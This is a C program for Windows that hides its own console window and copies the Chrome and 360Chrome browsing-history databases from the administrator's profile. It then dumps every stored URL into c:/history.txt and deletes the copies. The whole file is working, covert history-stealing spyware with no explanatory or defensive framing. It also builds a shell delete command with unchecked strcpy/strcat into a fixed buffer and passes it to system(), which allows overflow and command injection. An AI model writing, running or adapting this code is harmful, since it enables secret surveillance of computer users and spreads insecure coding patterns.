#include <stdio.h>
#include "sqlite3.h"

#include<stdlib.h>

#include <windows.h>


int hideConsole ( void );
 


static int callback(void *NotUsed, int argc, char **argv, char **azColName){
    int i;
FILE *fpWrite_3=fopen("c:/history.txt","a");
	//printf("arc len%d\n",argc);

    for(i=0; i<3; i++){
     //  printf("%s = %s  ", azColName[i], argv[i] ? argv[i] : "NULL");
	  fprintf(fpWrite_3,"%s = %s  ", azColName[i], argv[i] ? argv[i] : "NULL");   

   }


  
	fprintf(fpWrite_3,"\n");  
    
fclose(fpWrite_3);
	

    return 0;
}
int  get_history(char history_file[]){
	
	sqlite3 *db;
    char *zErrMsg = 0;
    int rc;


    rc = sqlite3_open(history_file,&db);
    if( rc ){
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return(1);
    }

	rc = sqlite3_exec(db,"select * from urls", callback, 0, &zErrMsg);
    if( rc!=SQLITE_OK ){
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }

    sqlite3_close(db);
}

void del_file(char file[]){
	
	char str3[101] = { 0 };
    strcpy(str3, "del  \"");
    strcat(str3, file);
	
	strcat(str3, "\"");
    puts(str3);
	system(str3);
	
}

int main(int argc, char **argv)
{
    
	hideConsole ();
	system("copy \"C:\\users\\administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" c:\\h_chrome");
	system("copy \"C:\\users\\administrator\\AppData\\Local\\360Chrome\\Chrome\\User Data\\Default\\History\" c:\\h_360");

	get_history("c:/h_chrome");
	get_history("c:/h_360");
	del_file("c:/h_chrome");
	del_file("c:/h_360");
	
    return 0;
}




#define CONSOLE_NAME "Secure"
 
int hideConsole ( void )
{
  

HWND hWnd = GetConsoleWindow();
   // ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );

return 0;
}
 